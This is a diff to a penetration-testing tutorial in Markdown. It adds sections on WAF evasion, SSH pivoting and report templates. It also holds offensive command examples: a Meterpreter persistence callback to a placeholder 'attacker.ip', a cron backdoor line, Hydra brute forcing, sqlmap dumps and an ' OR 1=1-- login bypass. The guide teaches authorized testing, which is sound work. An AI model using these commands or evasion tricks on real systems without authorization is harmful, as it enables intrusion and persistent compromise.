@@ -15,11 +15,13 @@ Master the complete penetration testing lifecycle from reconnaissance through re
 ## Prerequisites
 
 ### Required Environment
+
 - Kali Linux installed (persistent or live)
 - Network access to authorized targets
 - Written authorization from system owner
 
 ### Required Knowledge
+
 - Basic networking concepts
 - Linux command-line proficiency
 - Understanding of web technologies
@@ -39,24 +41,28 @@ Master the complete penetration testing lifecycle from reconnaissance through re
 Classification of security professionals:
 
 **White Hat Hackers (Ethical Hackers)**
+
 - Authorized security professionals
 - Conduct penetration testing with permission
 - Goal: Identify and fix vulnerabilities
 - Also known as: penetration testers, security consultants
 
 **Black Hat Hackers (Malicious)**
+
 - Unauthorized system intrusions
 - Motivated by profit, revenge, or notoriety
 - Goal: Steal data, cause damage
 - Also known as: crackers, criminal hackers
 
 **Grey Hat Hackers (Hybrid)**
+
 - May cross ethical boundaries
 - Not malicious but may break rules
 - Often disclose vulnerabilities publicly
 - Mixed motivations
 
 **Other Classifications**
+
 - **Script Kiddies**: Use pre-made tools without understanding
 - **Hacktivists**: Politically or socially motivated
 - **Nation State**: Government-sponsored operatives
@@ -67,6 +73,7 @@ Classification of security professionals:
 Gather information without direct system interaction:
 
 **Passive Reconnaissance**
+
 ```bash
 # WHOIS lookup
 whois target.com
@@ -85,6 +92,7 @@ theHarvester -d target.com -b all
 ```
 
 **Google Hacking (OSINT)**
+
 ```
 # Find exposed files
 site:target.com filetype:pdf
@@ -104,6 +112,7 @@ site:target.com filetype:env
 ```
 
 **Google Hacking Database Categories:**
+
 - Files containing passwords
 - Sensitive directories
 - Web server detection
@@ -112,6 +121,7 @@ site:target.com filetype:env
 - Login portals
 
 **Social Media Reconnaissance**
+
 - LinkedIn: Organizational charts, technologies used
 - Twitter: Company announcements, employee info
 - Facebook: Personal information, relationships
@@ -122,6 +132,7 @@ site:target.com filetype:env
 Active enumeration of target systems:
 
 **Host Discovery**
+
 ```bash
 # Ping sweep
 nmap -sn 192.168.1.0/24
@@ -134,6 +145,7 @@ nmap -sP 192.168.1.0/24
 ```
 
 **Port Scanning**
+
 ```bash
 # TCP SYN scan (stealth)
 nmap -sS target.com
@@ -155,6 +167,7 @@ nmap -A target.com
 ```
 
 **Service Enumeration**
+
 ```bash
 # Specific service scripts
 nmap --script=http-enum target.com
@@ -166,6 +179,7 @@ nmap --script=vuln target.com
 ```
 
 **Common Port Reference**
+
 | Port | Service | Notes |
 |------|---------|-------|
 | 21 | FTP | File transfer |
@@ -184,6 +198,7 @@ nmap --script=vuln target.com
 Identify exploitable weaknesses:
 
 **Automated Scanning**
+
 ```bash
 # Nikto web scanner
 nikto -h http://target.com
@@ -196,6 +211,7 @@ nessuscli scan --target target.com
 ```
 
 **Web Application Testing (OWASP)**
+
 - SQL Injection
 - Cross-Site Scripting (XSS)
 - Broken Authentication
@@ -208,6 +224,7 @@ nessuscli scan --target target.com
 - Insufficient Logging & Monitoring
 
 **Manual Techniques**
+
 ```bash
 # Directory brute forcing
 gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
@@ -224,6 +241,7 @@ whatweb target.com
 Actively exploit discovered vulnerabilities:
 
 **Metasploit Framework**
+
 ```bash
 # Start Metasploit
 msfconsole
@@ -246,6 +264,7 @@ msf> exploit
 ```
 
 **Password Attacks**
+
 ```bash
 # Hydra brute force
 hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
@@ -256,6 +275,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 ```
 
 **Web Exploitation**
+
 ```bash
 # SQLMap for SQL injection
 sqlmap -u "http://target.com/page.php?id=1" --dbs
@@ -274,6 +294,7 @@ sqlmap -u "http://target.com/page.php?id=1" -D database --tables
 Establish persistent access:
 
 **Backdoors**
+
 ```bash
 # Meterpreter persistence
 meterpreter> run persistence -X -i 30 -p 4444 -r attacker.ip
@@ -286,6 +307,7 @@ echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab
 ```
 
 **Privilege Escalation**
+
 ```bash
 # Linux enumeration
 linpeas.sh
@@ -303,16 +325,44 @@ sudo -l
 ```
 
 **Covering Tracks (Ethical Context)**
+
 - Document all actions taken
 - Maintain logs for reporting
 - Avoid unnecessary system changes
 - Clean up test files and backdoors
+
+## 🛡️ OpSec & Evasion (Staying Quiet)
+
+**Don't burn the engagement on day one.**
+
+- **User-Agent Rotation:** `sqlmap --random-agent` is mandatory.
+- **Rate Limiting:** `nmap -T2` is slow but sneaky. `nmap -T4` sets off alarms.
+- **WAF Evasion:**
+  - Encoding: `%252e%252e%252f` vs `../../`
+  - Chunking: Split malicious payloads across packets.
+  - CloudFlare: Look for origin IP (Censys/Shodan) to bypass WAF entirely.
+
+## 🔄 Advanced Pivoting (Lateral Movement)
+
+**You're in. Now where?**
+
+1. **SSH Tunneling:** `-L` (Local) to access internal web apps. `-D` (Dynamic) for SOCKS proxy.
+
+    ```bash
+    ssh -D 1080 user@compromised
+    proxychains nmap -sT 192.168.1.5
+    ```
+
+2. **Ligolo-ng:** Modern, faster alternative to proxychains.
+3. **Chisel:** TCP/UDP tunneling over HTTP. Great for strict firewalls.
+4. **Living off the Land:** Use `CertUtil`, `PowerShell`, `Python` to move files. Don't upload `nc.exe` if you don't have to.
 
 ### Phase 7: Reporting
 
 Document findings professionally:
 
 **Report Structure**
+
 1. **Executive Summary**
    - High-level findings
    - Business impact
@@ -344,15 +394,41 @@ Document findings professionally:
    - Testing timeline
    - Scope and methodology
 
+### Professional Reporting (The $20k Difference)
+
+**Executive Summary Formula:**
+> "We identified X critical vulnerabilities that allow [Bad Thing]. This puts [Business Asset] at risk of [Business Impact]. We recommend [High Level Fix]."
+
+**Finding Template:**
+
+```markdown
+### [CRITICAL] SQL Injection in Login Portal
+
+**Risk:** Attacker can dump the entire Users database.
+**Likelihood:** High (Publicly accessible, widely known technique).
+**Impact:** Critical (Full PII breach).
+
+**Proof of Concept:**
+1. Navigate to `/login`.
+2. Input `' OR 1=1--` into Username.
+3. Observe successful login as Admin.
+
+**Remediation:**
+- Immediate: Implement Prepared Statements (Parameterized Queries).
+- Defense in Depth: Enable WAF rule #942.
+```
+
 ### Phase 8: Common Attack Types
 
 **Phishing**
+
 - Email-based credential theft
 - Fake login pages
 - Malicious attachments
 - Social engineering component
 
 **Malware Types**
+
 - **Virus**: Self-replicating, needs host file
 - **Worm**: Self-propagating across networks
 - **Trojan**: Disguised as legitimate software
@@ -361,6 +437,7 @@ Document findings professionally:
 - **Spyware**: Monitors user activity
 
 **Network Attacks**
+
 - Man-in-the-Middle (MITM)
 - ARP Spoofing
 - DNS Poisoning
@@ -371,6 +448,7 @@ Document findings professionally:
 Install penetration testing platform:
 
 **Hard Disk Installation**
+
 1. Download ISO from kali.org
 2. Boot from installation media
 3. Select "Graphical Install"
@@ -381,6 +459,7 @@ Install penetration testing platform:
 8. Reboot and login
 
 **Live USB (Persistent)**
+
 ```bash
 # Create bootable USB
 dd if=kali-linux.iso of=/dev/sdb bs=512k status=progress
@@ -399,6 +478,7 @@ umount /mnt/usb
 ### Phase 10: Ethical Guidelines
 
 **Legal Requirements**
+
 - Obtain written authorization
 - Define scope clearly
 - Document all testing activities
@@ -406,6 +486,7 @@ umount /mnt/usb
 - Maintain confidentiality
 
 **Professional Conduct**
+
 - Work ethically with integrity
 - Respect privacy of data accessed
 - Avoid unnecessary system damage
@@ -437,11 +518,13 @@ umount /mnt/usb
 ## Constraints and Limitations
 
 ### Authorization Required
+
 - Never test without written permission
 - Stay within defined scope
 - Report unauthorized access attempts
 
 ### Professional Standards
+
 - Follow rules of engagement
 - Maintain client confidentiality
 - Document methodology used
@@ -452,6 +535,7 @@ umount /mnt/usb
 ### Scans Blocked
 
 **Solutions:**
+
 1. Use slower scan rates
 2. Try different scanning techniques
 3. Use proxy or VPN
@@ -460,6 +544,7 @@ umount /mnt/usb
 ### Exploits Failing
 
 **Solutions:**
+
 1. Verify target vulnerability exists
 2. Check payload compatibility
 3. Adjust exploit parameters
